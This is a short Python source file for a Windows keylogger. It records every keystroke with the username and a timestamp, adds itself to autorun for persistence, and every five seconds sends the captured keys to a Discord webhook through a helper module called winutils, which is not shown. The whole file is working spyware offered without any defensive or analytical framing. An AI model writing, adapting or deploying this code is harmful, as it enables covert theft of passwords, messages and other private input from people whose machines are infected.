#imports
from pynput.keyboard import Listener
from time import sleep
import threading
import winutils

#encoded discord webhook that recieves the logs
hook=""

#grabbing the absolute path of the script and rel path
abs_path=winutils.abs_path()
file_name=winutils.basename()
#list to store keys and start thread
keys = []
lock = threading.Lock()
user=winutils.get_user()
winutils.add_auto_run(file_name,file_name)

def on_press(key):
    """func to handle key press events and appends key arg, username, and timestamp to the keys list."""
    with lock:  
        keys.append(f"{user} : {key} at {winutils.time()}")

def send_keys_periodically():
    """func to send the logged keys to the Discord webhook periodically (every 5 seconds)."""
    while True:
        sleep(5)
        if not keys:
            continue
        #put message together
        message = "\n".join(keys)
        winutils.send_webhook(hook,message)
        keys.clear()

def main():
    """func to start the keylogger and the periodic sender thread"""
    #start a separate thread to send keys periodically
    sender_thread = threading.Thread(target=send_keys_periodically, daemon=True)
    sender_thread.start()
    #start the Listener to capture key events, keeps it running until stopped
    with Listener(on_press=on_press) as listener:
        listener.join()

main()